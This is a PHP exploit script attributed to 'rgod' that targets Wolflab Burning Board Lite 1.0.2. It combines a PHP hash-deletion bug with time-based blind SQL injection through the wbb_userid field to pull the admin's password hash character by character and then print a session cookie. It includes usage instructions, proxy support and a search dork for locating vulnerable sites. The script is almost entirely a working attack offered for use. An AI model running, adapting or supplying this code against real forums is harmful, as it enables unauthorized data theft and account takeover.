<?php
print_r('
--------------------------------------------------------------------------------
Wolflab Burning Board Lite 1.0.2 Zend_Hash_Del_Key_Or_Index /
/ blind sql injection exploit
by rgod retrog@alice.it
site: http://retrogod.altervista.org
dork: "Powered by Burning Board Lite 1.0.2 * 2001-2004"
--------------------------------------------------------------------------------
');
/*
magic_quotes_gpc=Off
works with register_globals = On
PHP < 4.4.3, 5 <= PHP < 5.1.4
*/
if ($argc<3) {
    print_r('
--------------------------------------------------------------------------------
Usage: php '.$argv[0].' host path OPTIONS
host:      target server (ip/hostname)
path:      path to wbblite
Options:
 -u[userid]:  specify the userid of your target (default: 1, admin)
 -p[port]:       " a port other than 80
 -P[ip:port]:    " a proxy
 -t[n]:       adjust query timeout (default: 10)
 -b[n]:          " the delay for benchmark()

Example:
php '.$argv[0].' localhost /wbblite/ -P1.1.1.1:80
 "       "       localhost / -u2 -p81
 "       "       localhost /forum/ -t15 -b20000000
 "       "       localhost / -t15 -b20000000
---------------------------------------------------------------------------------
');
    die;
}

error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';

function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
}

$host=$argv[1];
$path=$argv[2];
$uid=1;
$port=80;
$timeout=10;
$proxy="";
$b=100000000;
for ($i=3; $i<$argc; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
if ($temp=="-t")
{
  $timeout=(int) str_replace("-t","",$argv[$i]);
}
if ($temp=="-b")
{
  $b=(int) str_replace("-b","",$argv[$i]);
}
if ($temp=="-u")
{
  $uid=(int) str_replace("-b","",$argv[$i]);
}
}
if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$data ="wbb_userid=%27";
$data.="&-246470575=1";
$data.="&-73279541=1";
$packet ="POST ".$p." HTTP/1.0\r\n";
$packet.="Host: ".$host."\r\n";
$packet.="Content-Type: application/x-www-form-urlencoded\r\n";
$packet.="Content-Length: ".strlen($data)."\r\n";
$packet.="Cookie: wbb_userpassword=0;\r\n";
$packet.="Connection: Close\r\n\r\n";
$packet.=$data;
sendpacketii($packet);
if (eregi("mysql error number:",$html)){
    echo "vulnerable...\n";
    $temp=explode("users LEFT JOIN",$html);$temp2=explode("FROM ",$temp[0]);$prefix=$temp2[1];
    echo "prefix -> ".$prefix."\n";
    }
else
{die("not vulnerable...");}

$chars[0]=0;//null
$chars=array_merge($chars,range(48,57)); //numbers
$chars=array_merge($chars,range(97,102));//a-f letters
$j=1;$password="";
while (!strstr($password,chr(0)))
{
    for ($i=0; $i<=255; $i++)
    {
        if (in_array($i,$chars))
        {
            $sql="9999999'/**/OR/**/".$prefix."users.userid=$uid/**/AND/**/(IF((ASCII(SUBSTRING(password,".$j.",1))=".$i."),BENCHMARK(".$b.",CHAR(0)),-1))/**/LIMIT/**/1/*";
            $sql=urlencode($sql);
            $data ="wbb_userid=$sql";
            $data.="&-246470575=1";
            $data.="&-73279541=1";
            $packet ="POST ".$p." HTTP/1.0\r\n";
            $packet.="Host: ".$host."\r\n";
            $packet.="Content-Type: application/x-www-form-urlencoded\r\n";
            $packet.="Content-Length: ".strlen($data)."\r\n";
            $packet.="Cookie: wbb_userpassword=0;\r\n";
            $packet.="Connection: Close\r\n\r\n";
            $packet.=$data;
            sendpacketii($packet);
            if (eregi("mysql error number:",$html)) {
                die($html."\n\n"."debug: you have to modify sql code injected, it seems a different version...");
            }
            usleep(20000);
            $starttime=time();
            echo "starttime -> ".$starttime."\r\n";
            sendpacketii($packet);
            $endtime=time();
            echo "endtime -> ".$endtime."\r\n";
            $difftime=$endtime - $starttime;
            echo "difftime -> ".$difftime."\r\n";
            if ($difftime > $timeout) {$password.=chr($i);echo "password -> ".$password."[???]\r\n";sleep(2);break;}
        }
        if ($i==255) {
            die("\nExploit failed...");
        }
    }
$j++;
}

function is_hash($hash)
{
 if (ereg("^[a-f0-9]{32}",trim($hash))) {return true;}
 else {return false;}
}

if (is_hash($password)) {
    print_r('
--------------------------------------------------------------------------
cookie -> wbb_userid='.$uid.'; wbb_userpassword='.$hash.';
--------------------------------------------------------------------------
');
if ($uid==1) {
    echo "done, but... to have access to admin panel you need to break the hash\n";
}
}
else {
   echo "exploit failed...";
}
?>
